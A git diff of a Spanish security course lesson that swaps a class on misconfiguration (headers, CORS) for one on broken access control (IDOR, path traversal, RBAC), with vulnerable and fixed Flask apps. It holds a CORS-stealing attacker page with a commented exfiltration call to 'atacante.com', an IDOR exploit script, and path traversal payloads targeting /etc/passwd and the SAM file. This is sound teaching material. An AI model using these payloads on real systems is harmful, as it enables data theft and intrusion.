@@ -1,4 +1,4 @@
-# Clase 21: Configuracion de Seguridad Incorrecta
+# Clase 21: Control de Acceso Roto
 
 **Duracion:** 2 horas
 
@@ -6,732 +6,812 @@
 
 ## Objetivos de Aprendizaje
 
-1. Identificar errores comunes de configuracion de seguridad
-2. Configurar correctamente security headers HTTP (HSTS, X-Frame-Options, CSP, etc.)
-3. Comprender los riesgos de CORS mal configurado
-4. Implementar manejo de errores seguros sin revelar informacion sensible
-5. Conocer el estandar OWASP ASVS
+1. Diferenciar claramente entre autenticacion y autorizacion
+2. Identificar y explotar vulnerabilidades IDOR (Insecure Direct Object Reference)
+3. Comprender Path Traversal y como prevenirlo
+4. Implementar RBAC (Role-Based Access Control) correctamente
+5. Aplicar el principio de minimo privilegio
 
 ---
 
 ## Contenido Detallado
 
-### 1. Errores Comunes de Configuracion
+### 1. Autenticacion vs. Autorizacion
 
-| Error | Descripcion | Riesgo |
-|-------|-------------|--------|
-| **Configuraciones por defecto** | Credenciales admin/admin, puertos abiertos, servicios innecesarios | Acceso no autorizado inmediato |
-| **Directorios listables** | Directory listing habilitado en servidores web | Exposicion de archivos sensibles, estructura del proyecto |
-| **Headers HTTP inseguros** | Falta de HSTS, X-Frame-Options, CSP | Clickjacking, XSS, MITM, MIME sniffing |
-| **Manejo de errores verbose** | Stack traces, versiones de software en respuestas de error | Informacion para ataques dirigidos |
-| **CORS mal configurado** | `Access-Control-Allow-Origin: *` o reflejo del origen | Exfiltracion de datos desde cualquier origen |
-| **Servicios innecesarios activos** | Puertos extras, modulos no usados (ej: WebDAV, FTP) | Superficie de ataque innecesaria |
-| **Permisos incorrectos** | Archivos world-writable, contenedores como root | Escalada de privilegios |
+| Concepto | Definicion | Ejemplo |
+|----------|-----------|---------|
+| **Autenticacion** | Verificar la identidad del usuario (quien eres) | Login con usuario/contrasena, biometria, 2FA |
+| **Autorizacion** | Verificar que el usuario tiene permiso para hacer algo (que puedes hacer) | El usuario admin puede borrar, el viewer solo puede leer |
 
-### 2. Security Headers HTTP
+**Frase clave:** La autenticacion falla cuando alguien que no es quien dice ser accede; la autorizacion falla cuando alguien legitimo accede a lo que no deberia.
 
-Los security headers son cabeceras HTTP que el servidor envia al navegador para activar comportamientos de seguridad.
+### 2. IDOR (Insecure Direct Object Reference)
 
-| Header | Que hace | Valor Recomendado |
-|--------|----------|-------------------|
-| **Strict-Transport-Security (HSTS)** | Fuerza conexiones HTTPS, previene SSL stripping | `max-age=31536000; includeSubDomains; preload` |
-| **X-Frame-Options** | Previene clickjacking al no permitir iframes | `DENY` o `SAMEORIGIN` |
-| **X-Content-Type-Options** | Previene MIME sniffing (navegador no adivina el tipo) | `nosniff` |
-| **Content-Security-Policy (CSP)** | Controla que recursos puede cargar la pagina | `default-src 'self'` (restrictivo) |
-| **X-XSS-Protection** | Activa filtro XSS del navegador (obsoleto en Chrome) | `1; mode=block` |
-| **Referrer-Policy** | Controla que informacion se envia en el header Referer | `strict-origin-when-cross-origin` |
-| **Permissions-Policy** | Controla que APIs del navegador puede usar la pagina | `camera=(), microphone=(), geolocation=()` |
-| **Cache-Control** | Previene cacheo de respuestas sensibles | `no-store, max-age=0` |
+IDOR ocurre cuando una aplicacion expone referencias directas a objetos internos (IDs, nombres de archivo, claves) y no verifica que el usuario tenga permiso para acceder a ese objeto.
 
-### 3. CORS (Cross-Origin Resource Sharing)
-
-CORS permite que un sitio web acceda a recursos de otro origen. Una configuracion incorrecta puede exponer datos sensibles.
-
-**Configuracion insegura:**
-
-```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Methods: GET, POST, PUT, DELETE
-Access-Control-Allow-Credentials: true
-```
-
-Con `*` y `Allow-Credentials: true`, cualquier sitio web puede leer respuestas autenticadas.
-
-**Reflejo del Origin (otra mala practica):**
-
-Si el servidor refleja el header `Origin` del cliente como `Access-Control-Allow-Origin`, un atacante puede hacer una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`.
-
-### 4. Manejo de Errores que Revela Informacion
-
-**Nunca devolver al cliente:**
-
-- Stack traces completos
-- Versiones de software (Python 3.11, Flask 2.3, Django 4.2)
-- Nombres de archivos y lineas de codigo
-- Informacion de la base de datos (nombres de tablas, columnas)
-- Tokens internos, API keys, config paths
-
-**Buenas practicas:**
-- Devolver mensajes genericos ("Error interno del servidor", "Recurso no encontrado")
-- Loggear el error completo en el servidor para debugging
-- Usar paginas de error personalizadas (403.html, 404.html, 500.html)
-
-### 5. OWASP ASVS (Application Security Verification Standard)
-
-ASVS es un estandar para verificar la seguridad de aplicaciones web. Tiene 3 niveles de verificacion:
-
-| Nivel | Descripcion | Para quien es |
-|-------|-------------|---------------|
-| **L1** | Seguridad basica contra vulnerabilidades comunes | Todas las aplicaciones |
-| **L2** | Seguridad contra ataques mas sofisticados | Apps que manejan datos sensibles |
-| **L3** | Seguridad de alto nivel para apps criticas | Apps financieras, salud, infraestructura critica |
-
-**Ejemplos de requisitos ASVS relacionados a configuracion:**
-
-- V2.1: Verificar que el sistema use TLS 1.2+ y configuracion segura
-- V14.1: Verificar que las configuraciones por defecto esten deshabilitadas
-- V14.2: Verificar que headers de seguridad esten presentes
-- V14.5: Verificar que CORS este configurado correctamente
-
----
-
-## Ejercicio 1: Analizar Security Headers de un Sitio Web
-
-### Escenario
-
-Usar Python para analizar los headers HTTP de respuesta de un sitio web e identificar cuales faltan.
+**Ejemplo clasico:**
 
 ```python
-"""
-security_headers_analyzer.py
-"""
-import requests
-from typing import Dict, List, Tuple
+# VULNERABLE: Sin verificacion de pertenencia
+@app.route('/api/factura/<int:factura_id>')
+def ver_factura(factura_id):
+    factura = database.get_factura(factura_id)
+    return jsonify(factura)
+    # Cualquier usuario autenticado puede cambiar factura_id y ver facturas ajenas
+```
 
-# Definicion de headers deseables y sus valores recomendados
-SECURITY_HEADERS = {
-    'Strict-Transport-Security': {
-        'descripcion': 'Fuerza conexiones HTTPS',
-        'recomendado': 'max-age=31536000; includeSubDomains',
-        'severidad': 'ALTA',
-    },
-    'X-Frame-Options': {
-        'descripcion': 'Previene clickjacking',
-        'recomendado': 'DENY o SAMEORIGIN',
-        'severidad': 'ALTA',
-    },
-    'X-Content-Type-Options': {
-        'descripcion': 'Previene MIME sniffing',
-        'recomendado': 'nosniff',
-        'severidad': 'MEDIA',
-    },
-    'Content-Security-Policy': {
-        'descripcion': 'Controla recursos permitidos (XSS prevention)',
-        'recomendado': 'default-src \'self\'',
-        'severidad': 'ALTA',
-    },
-    'X-XSS-Protection': {
-        'descripcion': 'Activa filtro XSS del navegador',
-        'recomendado': '1; mode=block',
-        'severidad': 'MEDIA',
-    },
-    'Referrer-Policy': {
-        'descripcion': 'Controla informacion enviada en Referer',
-        'recomendado': 'strict-origin-when-cross-origin',
-        'severidad': 'MEDIA',
-    },
-    'Permissions-Policy': {
-        'descripcion': 'Controla APIs del navegador',
-        'recomendado': 'geolocation=(), microphone=(), camera=()',
-        'severidad': 'BAJA',
-    },
-    'Cache-Control': {
-        'descripcion': 'Controla cacheo de respuestas',
-        'recomendado': 'no-store, max-age=0 (para datos sensibles)',
-        'severidad': 'MEDIA',
-    },
+**Ataque:** El atacante cambia `?id=123` a `?id=124` y accede a datos de otro usuario.
+
+### 3. Elevacion de Privilegios
+
+Ocurre cuando un usuario obtiene permisos que no le corresponden.
+
+**Vertical:** Usuario normal obtiene privilegios de admin (ej: modificar rol en la request).
+
+**Horizontal:** Usuario normal accede a datos de otro usuario del mismo nivel.
+
+**Ejemplo de elevacion vertical:**
+
+```python
+# VULNERABLE: El rol viene del cliente
+@app.route('/api/admin/delete', methods=['POST'])
+def delete_user():
+    user_role = request.json.get('role')  # El cliente envia 'admin'
+    if user_role == 'admin':
+        # Ejecutar accion administrativa
+        pass
+```
+
+### 4. Path Traversal
+
+Path traversal permite al atacante leer archivos fuera del directorio permitido usando `../`.
+
+**Ejemplo vulnerable:**
+
+```python
+@app.route('/api/files/<filename>')
+def get_file(filename):
+    # VULNERABLE: El atacante puede pasar ../../etc/passwd
+    with open(f'/var/app/files/{filename}', 'r') as f:
+        return f.read()
+```
+
+**Ataque:** `GET /api/files/../../../windows/system32/config/sam`
+
+### 5. RBAC (Role-Based Access Control)
+
+RBAC asigna permisos basados en roles. Una implementacion incorrecta es la causa #1 de broken access control.
+
+**Estructura basica de RBAC:**
+
+```
+USUARIOS → ROLES → PERMISOS
+                ↓
+           Acciones permitidas
+```
+
+**Modelo de datos:**
+
+```python
+# Definicion de roles y permisos
+ROLES = {
+    'admin': ['crear', 'leer', 'actualizar', 'eliminar', 'gestionar_usuarios'],
+    'user': ['crear', 'leer', 'actualizar'],  # Solo sus propios recursos
+    'viewer': ['leer'],  # Solo lectura
 }
-
-def analyze_security_headers(url: str) -> List[Dict]:
-    """
-    Analiza los security headers de un sitio web.
-    Retorna una lista con los resultados del analisis.
-    """
-    try:
-        response = requests.get(url, timeout=10, allow_redirects=True)
-        headers = response.headers
-        final_url = response.url
-
-        print(f"Analizando: {url}")
-        print(f"URL final: {final_url}")
-        print(f"Status Code: {response.status_code}")
-        print(f"Servidor: {headers.get('Server', 'No especificado')}")
-        print("-" * 60)
-
-        results = []
-        for header_name, config in SECURITY_HEADERS.items():
-            present = header_name in headers
-            value = headers.get(header_name, '')
-
-            result = {
-                'header': header_name,
-                'present': present,
-                'value': value,
-                'recomendado': config['recomendado'],
-                'descripcion': config['descripcion'],
-                'severidad': config['severidad'],
-            }
-            results.append(result)
-
-            status = "OK" if present else "FALTA"
-            print(f"[{status}] {header_name}")
-            if present:
-                print(f"       Valor: {value}")
-            print(f"       Recomendado: {config['recomendado']}")
-            print()
-
-        return results
-
-    except Exception as e:
-        print(f"Error al analizar {url}: {e}")
-        return []
-
-def generate_report(results: List[Dict], url: str):
-    """Genera un reporte de seguridad en formato texto"""
-    missing = [r for r in results if not r['present']]
-    present = [r for r in results if r['present']]
-
-    print("=" * 60)
-    print(f"RESUMEN DE SEGURIDAD - {url}")
-    print("=" * 60)
-    print(f"\nHeaders presentes: {len(present)}/{len(results)}")
-    print(f"Headers faltantes: {len(missing)}/{len(results)}")
-    print()
-
-    if missing:
-        print("Headers FALTANTES (priorizar correccion):")
-        print("-" * 40)
-        for m in missing:
-            severidad = m['severidad']
-            icono = "!!!" if severidad == "ALTA" else "!!" if severidad == "MEDIA" else "!"
-            print(f"  {icono} [{severidad}] {m['header']}")
-            print(f"     {m['descripcion']}")
-            print(f"     Valor recomendado: {m['recomendado']}")
-            print()
-
-    if present:
-        print("\nHeaders presentes:")
-        print("-" * 40)
-        for p in present:
-            print(f"  [+] {p['header']}: {p['value'][:80]}...")
-            print()
-
-    # Calcular puntuacion
-    score = len(present) / len(results) * 100
-    grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 50 else "D" if score >= 25 else "F"
-    print(f"Puntuacion: {score:.1f}% - Grado: {grade}")
-
-# ============================================================
-# EJECUCION
-# ============================================================
-
-if __name__ == '__main__':
-    # Analizar sitios de ejemplo
-    sitios = [
-        'https://github.com',
-        'https://www.google.com',
-        'https://httpbin.org/response-headers',
-    ]
-
-    for sitio in sitios:
-        results = analyze_security_headers(sitio)
-        if results:
-            generate_report(results, sitio)
-        print("\n" + "=" * 60 + "\n")
 ```
 
-**Ejecucion:**
+### 6. Principio de Minimo Privilegio
 
-```bash
-pip install requests
-python security_headers_analyzer.py
-```
+Cada usuario/proceso debe tener exactamente los permisos necesarios para realizar su funcion, ni mas ni menos.
+
+**Aplicacion practica:**
+- Un viewer no necesita permiso de eliminacion
+- Un trabajo batch que solo lee no necesita permisos de escritura
+- Un proceso que sirve archivos no necesita ejecutar comandos del sistema
+- Los contenedores deben correr como non-root
+
+### 7. OWASP Top 10 - Broken Access Control
+
+Desde 2021, Broken Access Control es la categoria #1 del OWASP Top 10.
+
+**Estadisticas:**
+- 94% de las aplicaciones probadas tienen algun tipo de broken access control
+- La tasa de incidencia promedio es 3.81%
+- Mas de 318,000 ocurrencias de CVEs relacionados
 
 ---
 
-## Ejercicio 2: Configurar Security Headers en Flask
+## Ejercicio 1: Explotar y Corregir IDOR en Flask
 
 ### Escenario
 
-Implementar una configuracion completa de security headers en una aplicacion Flask con soporte para entornos de desarrollo y produccion.
+Una aplicacion de notas permite a los usuarios ver sus notas por ID. El sistema tiene IDOR porque no verifica que la nota pertenezca al usuario.
+
+**Paso 1: Aplicacion vulnerable**
 
 ```python
 """
-secure_flask_app.py - App Flask con security headers completos
-"""
-from flask import Flask, jsonify, request, make_response, render_template_string
-import os
-
-app = Flask(__name__)
-
-# ============================================================
-# CONFIGURACION DE SEGURIDAD
-# ============================================================
-
-class SecurityConfig:
-    """Configuracion de seguridad por entorno"""
-    def __init__(self, environment='production'):
-        self.environment = environment
-
-    def get_headers(self):
-        """Retorna los security headers apropiados para el entorno"""
-        headers = {}
-
-        # HSTS - Siempre activo en produccion
-        if self.environment == 'production':
-            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
-        elif self.environment == 'staging':
-            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-        else:
-            # Development: max-age bajo para pruebas
-            headers['Strict-Transport-Security'] = 'max-age=300'
-
-        # Prevenir clickjacking
-        headers['X-Frame-Options'] = 'DENY'
-
-        # Prevenir MIME sniffing
-        headers['X-Content-Type-Options'] = 'nosniff'
-
-        # CSP - Diferente por entorno
-        if self.environment == 'production':
-            headers['Content-Security-Policy'] = self._build_csp('strict')
-        else:
-            headers['Content-Security-Policy'] = self._build_csp('relaxed')
-
-        # XSS Protection (modern browsers ignoran, pero por compatibilidad)
-        headers['X-XSS-Protection'] = '1; mode=block'
-
-        # Referrer Policy
-        headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-
-        # Permissions Policy (control de APIs del navegador)
-        headers['Permissions-Policy'] = (
-            'camera=(), '
-            'microphone=(), '
-            'geolocation=(), '
-            'payment=(), '
-            'usb=()'
-        )
-
-        # Cache control para respuestas sensibles
-        headers['Cache-Control'] = 'no-store, max-age=0'
-        headers['Pragma'] = 'no-cache'
-        headers['Expires'] = '0'
-
-        return headers
-
-    def _build_csp(self, mode='strict'):
-        """Construye la politica CSP"""
-        if mode == 'strict':
-            return (
-                "default-src 'self'; "
-                "script-src 'self'; "
-                "style-src 'self'; "
-                "img-src 'self'; "
-                "font-src 'self'; "
-                "connect-src 'self'; "
-                "frame-ancestors 'none'; "
-                "form-action 'self'; "
-                "base-uri 'self'; "
-                "object-src 'none'"
-            )
-        else:
-            # CSP relajado para desarrollo (permite CDNs, inline scripts con nonce)
-            return (
-                "default-src 'self'; "
-                "script-src 'self' https://cdnjs.cloudflare.com 'nonce-dev'; "
-                "style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; "
-                "img-src 'self' data:; "
-                "font-src 'self'; "
-                "connect-src 'self' ws:; "
-                "frame-ancestors 'none'; "
-                "form-action 'self'; "
-                "base-uri 'self'; "
-                "object-src 'none'"
-            )
-
-
-# Detectar entorno
-ENVIRONMENT = os.getenv('FLASK_ENV', 'development')
-security_config = SecurityConfig(ENVIRONMENT)
-
-
-@app.after_request
-def add_security_headers(response):
-    """Middleware que agrega security headers a todas las respuestas"""
-    headers = security_config.get_headers()
-    for name, value in headers.items():
-        response.headers[name] = value
-
-    # CORS controlado
-    origin = request.headers.get('Origin', '')
-    # Solo permitir origenes confiables
-    allowed_origins = ['https://mydomain.com', 'https://app.mydomain.com']
-    if origin in allowed_origins:
-        response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
-        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
-        response.headers['Access-Control-Allow-Credentials'] = 'true'
-        response.headers['Access-Control-Max-Age'] = '3600'
-
-    return response
-
-
-@app.errorhandler(403)
-def forbidden(e):
-    """Pagina de error 403 personalizada (sin revelar informacion)"""
-    return jsonify({'error': 'Acceso denegado'}), 403
-
-
-@app.errorhandler(404)
-def not_found(e):
-    """Pagina de error 404 personalizada"""
-    return jsonify({'error': 'Recurso no encontrado'}), 404
-
-
-@app.errorhandler(500)
-def internal_error(e):
-    """Pagina de error 500 personalizada - NUNCA revelar stack trace"""
-    # Loggear el error completo en el servidor
-    app.logger.error(f"Error 500: {str(e)}", exc_info=True)
-    # Devolver mensaje generico
-    return jsonify({'error': 'Error interno del servidor'}), 500
-
-
-# ============================================================
-# RUTAS DE EJEMPLO
-# ============================================================
-
-@app.route('/')
-def index():
-    return jsonify({
-        'mensaje': 'API segura',
-        'entorno': ENVIRONMENT,
-    })
-
-
-@app.route('/api/usuarios/<int:user_id>')
-def get_user(user_id):
-    # Simular respuesta con datos sensibles con headers anti-cache
-    response = make_response(jsonify({
-        'id': user_id,
-        'nombre': 'Usuario Ejemplo',
-        'email': 'usuario@example.com',
-    }))
-    # Cache-Control adicional para datos sensibles
-    response.headers['Cache-Control'] = 'no-store, must-revalidate'
-    response.headers['Pragma'] = 'no-cache'
-    return response
-
-
-# ============================================================
-# VERIFICACION
-# ============================================================
-
-@app.route('/debug/headers')
-def debug_headers():
-    """Endpoint para verificar los headers de seguridad configurados"""
-    headers = dict(security_config.get_headers())
-    return jsonify({
-        'security_headers': headers,
-        'environment': ENVIRONMENT,
-        'note': 'Estos headers se aplican a TODAS las respuestas'
-    })
-
-
-if __name__ == '__main__':
-    print(f"Iniciando en entorno: {ENVIRONMENT}")
-    print(f"CSP activa: {security_config.get_headers().get('Content-Security-Policy')}")
-    app.run(host='127.0.0.1', port=5000, debug=False)
-```
-
-**Verificar los headers:**
-
-```bash
-# Iniciar servidor
-python secure_flask_app.py
-
-# Verificar headers con curl
-curl -v http://127.0.0.1:5000/ 2>&1 | grep -i -E "^(< |strict|x-frame|x-content|content-securit|referrer|permissions|cache)"
-
-# Verificar con script Python
-python -c "
-import requests
-r = requests.get('http://127.0.0.1:5000/')
-for k, v in r.headers.items():
-    if any(h in k.lower() for h in ['strict', 'frame', 'content-type', 'content-securit', 'referrer', 'x-xss', 'permission', 'cache']):
-        print(f'{k}: {v}')
-"
-```
-
----
-
-## Ejercicio 3: CORS Mal Configurado - Version Vulnerable y Segura
-
-### Escenario
-
-Un servidor tiene CORS configurado incorrectamente permitiendo que cualquier sitio web lea datos del usuario autenticado.
-
-**Version vulnerable:**
-
-```python
-"""
-cors_vulnerable.py - Servidor con CORS mal configurado
+app_idor.py - Aplicacion con IDOR
 """
 from flask import Flask, jsonify, request, session
+import uuid
 
 app = Flask(__name__)
 app.secret_key = 'supersecretkey'
 
-# Simular base de datos de usuarios (datos bancarios)
-USUARIOS = {
-    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
-    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
+# Base de datos simulada
+notas_db = {}
+usuarios_db = {
+    'alice': {'password': 'pass123', 'id': 1},
+    'bob': {'password': 'pass456', 'id': 2},
 }
 
-@app.route('/api/perfil')
-def perfil():
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
-
-    user_id = session['user_id']
-    if user_id not in USUARIOS:
-        return jsonify({'error': 'Usuario no encontrado'}), 404
-
-    user_data = USUARIOS[user_id]
-
-    # PROBLEMA 1: CORS demasiado permisivo
-    origin = request.headers.get('Origin', '')
-    response = jsonify(user_data)
-
-    # Refleja cualquier origen (malisimo)
-    if origin:
-        response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Credentials'] = 'true'
-
-    return response
+# Crear notas de ejemplo
+notas_db[1] = [
+    {'id': 101, 'titulo': 'Nota secreta de Alice', 'contenido': 'Mi contrasena es alice123'},
+    {'id': 102, 'titulo': 'Lista de compras', 'contenido': 'Leche, pan, huevos'},
+]
+notas_db[2] = [
+    {'id': 201, 'titulo': 'Nota de Bob', 'contenido': 'Deberia 1000USD a alguien'},
+    {'id': 202, 'titulo': 'Ideas de proyecto', 'contenido': 'App de ciberseguridad'},
+]
 
 @app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
-    if data.get('user') == 'juan' and data.get('pass') == '1234':
-        session['user_id'] = 1
-        return jsonify({'ok': True})
+    username = data.get('username')
+    password = data.get('password')
+
+    if username in usuarios_db and usuarios_db[username]['password'] == password:
+        session['user_id'] = usuarios_db[username]['id']
+        session['username'] = username
+        return jsonify({'mensaje': 'Login exitoso', 'usuario': username})
     return jsonify({'error': 'Credenciales invalidas'}), 401
 
+@app.route('/api/notas', methods=['GET'])
+def listar_notas():
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+    user_id = session['user_id']
+    notas = notas_db.get(user_id, [])
+    return jsonify(notas)
+
+@app.route('/api/notas/<int:nota_id>')
+def ver_nota(nota_id):
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    # VULNERABLE: Busca la nota por ID sin verificar pertenencia
+    for uid, notas in notas_db.items():
+        for nota in notas:
+            if nota['id'] == nota_id:
+                return jsonify(nota)
+
+    return jsonify({'error': 'Nota no encontrada'}), 404
+
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='127.0.0.1', port=5000, debug=False)
 ```
 
-**Pagina atacante que explota CORS mal configurado:**
-
-```html
-<!-- evil.html - Pagina del atacante que roba datos via CORS -->
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Prueba de CORS</title>
-</head>
-<body>
-    <h1>Ganaste un premio!</h1>
-    <p>Haz click para reclamar...</p>
-
-    <script>
-        // El atacante pone esta pagina en atacante.com
-        // Cuando un usuario autenticado en bank.com la visite...
-
-        function stealData() {
-            var xhr = new XMLHttpRequest();
-            xhr.withCredentials = true;  // Envia cookies de la sesion
-            xhr.open('GET', 'http://127.0.0.1:5000/api/perfil', true);
-
-            xhr.onload = function() {
-                // Datos robados! (gracias a CORS mal configurado)
-                var data = JSON.parse(xhr.responseText);
-                document.getElementById('result').innerHTML =
-                    '<h2>Datos Robados:</h2>' +
-                    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
-
-                // Enviar a servidor del atacante (simulado)
-                console.log('DATOS ROBADOS:', data);
-                // fetch('https://atacante.com/steal', { method: 'POST', body: JSON.stringify(data) });
-            };
-
-            xhr.onerror = function() {
-                document.getElementById('result').innerHTML = 'Error al robar datos';
-            };
-
-            xhr.send();
-        }
-
-        // Ejecutar inmediatamente
-        stealData();
-    </script>
-
-    <div id="result"></div>
-</body>
-</html>
-```
-
-**Version corregida (CORS seguro):**
+**Paso 2: Script de explotacion**
 
 ```python
 """
-cors_seguro.py - Configuracion CORS segura
+exploit_idor.py - Explotacion de IDOR
+"""
+import requests
+
+BASE = "http://127.0.0.1:5000"
+
+# 1. Login como Alice
+session = requests.Session()
+login_data = {'username': 'alice', 'password': 'pass123'}
+r = session.post(f"{BASE}/login", json=login_data)
+print(f"Login como Alice: {r.json()}")
+
+# 2. Listar notas de Alice (deberia ver solo las suyas)
+r = session.get(f"{BASE}/api/notas")
+print(f"Notas de Alice: {r.json()}")
+
+# 3. IDOR: Intentar ver nota de Bob (ID 201)
+r = session.get(f"{BASE}/api/notas/201")
+print(f"IDOR - Nota de Bob vista por Alice: {r.json()}")
+```
+
+**Paso 3: Version corregida (verificando pertenencia)**
+
+```python
+"""
+app_idor_segura.py - Version corregida con control de acceso
 """
 from flask import Flask, jsonify, request, session
+import uuid
+
+app = Flask(__name__)
+app.secret_key = 'supersecretkey'
+
+# Base de datos simulada - cada nota registra su dueno
+notas_db = {}
+usuarios_db = {
+    'alice': {'password': 'pass123', 'id': 1},
+    'bob': {'password': 'pass456', 'id': 2},
+}
+
+# Las notas ahora incluyen user_id
+notas_db[1] = [
+    {'id': 101, 'user_id': 1, 'titulo': 'Nota secreta de Alice', 'contenido': 'Mi contrasena es alice123'},
+    {'id': 102, 'user_id': 1, 'titulo': 'Lista de compras', 'contenido': 'Leche, pan, huevos'},
+]
+notas_db[2] = [
+    {'id': 201, 'user_id': 2, 'titulo': 'Nota de Bob', 'contenido': 'Deberia 1000USD a alguien'},
+    {'id': 202, 'user_id': 2, 'titulo': 'Ideas de proyecto', 'contenido': 'App de ciberseguridad'},
+]
+
+def login_required(f):
+    """Decorador para verificar autenticacion"""
+    def wrapper(*args, **kwargs):
+        if 'user_id' not in session:
+            return jsonify({'error': 'No autenticado'}), 401
+        return f(*args, **kwargs)
+    wrapper.__name__ = f.__name__
+    return wrapper
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    username = data.get('username')
+    password = data.get('password')
+
+    if username in usuarios_db and usuarios_db[username]['password'] == password:
+        session['user_id'] = usuarios_db[username]['id']
+        session['username'] = username
+        return jsonify({'mensaje': 'Login exitoso', 'usuario': username})
+    return jsonify({'error': 'Credenciales invalidas'}), 401
+
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.clear()
+    return jsonify({'mensaje': 'Sesion cerrada'})
+
+@app.route('/api/notas', methods=['GET'])
+@login_required
+def listar_notas():
+    user_id = session['user_id']
+    notas = notas_db.get(user_id, [])
+    return jsonify(notas)
+
+@app.route('/api/notas/<int:nota_id>', methods=['GET'])
+@login_required
+def ver_nota(nota_id):
+    user_id = session['user_id']
+
+    # CORREGIDO: Verificar que la nota pertenece al usuario
+    notas = notas_db.get(user_id, [])
+    for nota in notas:
+        if nota['id'] == nota_id:
+            return jsonify(nota)
+
+    return jsonify({'error': 'Nota no encontrada o acceso denegado'}), 404
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000, debug=False)
+```
+
+**Paso 4: Verificar la correccion**
+
+```python
+"""
+test_idor_seguro.py - Verificar que la correccion funciona
+"""
+import requests
+
+BASE = "http://127.0.0.1:5000"
+
+session = requests.Session()
+
+# Login como Alice
+session.post(f"{BASE}/login", json={'username': 'alice', 'password': 'pass123'})
+
+# Intentar ver nota de Bob
+r = session.get(f"{BASE}/api/notas/201")
+print(f"Intento de IDOR bloqueado: {r.json()}")
+# Debe devolver: {'error': 'Nota no encontrada o acceso denegado'} con 404
+
+# Ver nota propia
+r = session.get(f"{BASE}/api/notas/101")
+print(f"Nota propia accesible: {r.json()}")
+```
+
+---
+
+## Ejercicio 2: Implementar RBAC en una API REST con 3 Roles
+
+### Escenario
+
+Implementar un sistema RBAC completo con 3 roles (admin, user, viewer) para una API REST de gestion de documentos.
+
+```python
+"""
+rbac_api.py - API REST con RBAC completo
+"""
+from flask import Flask, jsonify, request, session, abort
+from functools import wraps
 import os
 
 app = Flask(__name__)
 app.secret_key = os.urandom(32).hex()
 
-# Lista blanca de origenes permitidos
-ALLOWED_ORIGINS = frozenset([
-    'https://www.bank.com',
-    'https://bank.com',
-    'https://app.bank.com',
-])
+# ============================================================
+# CONFIGURACION RBAC
+# ============================================================
 
-# Metodos HTTP permitidos
-ALLOWED_METHODS = ['GET', 'POST', 'PUT', 'DELETE']
-
-# Headers permitidos en requests
-ALLOWED_HEADERS = ['Content-Type', 'Authorization', 'X-CSRF-Token']
-
-# Cache de preflight (24 horas)
-PREFLIGHT_MAX_AGE = 86400
-
-USUARIOS = {
-    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
-    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
+# Definicion de permisos
+PERMISOS = {
+    'admin': [
+        'documentos:crear', 'documentos:leer', 'documentos:actualizar',
+        'documentos:eliminar', 'documentos:listar', 'usuarios:gestionar',
+        'reportes:generar', 'configuracion:editar'
+    ],
+    'user': [
+        'documentos:crear', 'documentos:leer', 'documentos:actualizar',
+        'documentos:listar'
+        # Sin eliminar, sin gestion de usuarios
+    ],
+    'viewer': [
+        'documentos:leer', 'documentos:listar'
+        # Solo lectura
+    ],
 }
 
-def configure_cors(response):
-    """Configura CORS de forma segura"""
-    origin = request.headers.get('Origin', '')
+# Base de datos de usuarios
+USUARIOS = {
+    1: {'username': 'admin', 'password': 'admin123', 'role': 'admin'},
+    2: {'username': 'juan', 'password': 'user123', 'role': 'user'},
+    3: {'username': 'invitado', 'password': 'view123', 'role': 'viewer'},
+}
 
-    # Solo permitir origenes de la lista blanca
-    if origin in ALLOWED_ORIGINS:
-        response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Credentials'] = 'true'
-        response.headers['Access-Control-Allow-Methods'] = ', '.join(ALLOWED_METHODS)
-        response.headers['Access-Control-Allow-Headers'] = ', '.join(ALLOWED_HEADERS)
-        response.headers['Access-Control-Max-Age'] = str(PREFLIGHT_MAX_AGE)
+# Base de datos de documentos (simulada)
+DOCUMENTOS = {
+    1: {'titulo': 'Plan de seguridad', 'contenido': 'Contenido confidencial...', 'owner_id': 1},
+    2: {'titulo': 'Reporte mensual', 'contenido': 'Datos del mes...', 'owner_id': 2},
+    3: {'titulo': 'Manual de usuario', 'contenido': 'Instrucciones...', 'owner_id': 2},
+}
+
+next_doc_id = 4
+
+# ============================================================
+# DECORADORES DE SEGURIDAD
+# ============================================================
+
+def requiere_permiso(permiso):
+    """Decorador que verifica que el usuario tenga un permiso especifico"""
+    def decorator(f):
+        @wraps(f)
+        def wrapper(*args, **kwargs):
+            if 'user_id' not in session:
+                return jsonify({'error': 'No autenticado'}), 401
+
+            user_id = session['user_id']
+            if user_id not in USUARIOS:
+                session.clear()
+                return jsonify({'error': 'Usuario no valido'}), 401
+
+            user_role = USUARIOS[user_id]['role']
+            user_permisos = PERMISOS.get(user_role, [])
+
+            if permiso not in user_permisos:
+                return jsonify({
+                    'error': 'Permiso denegado',
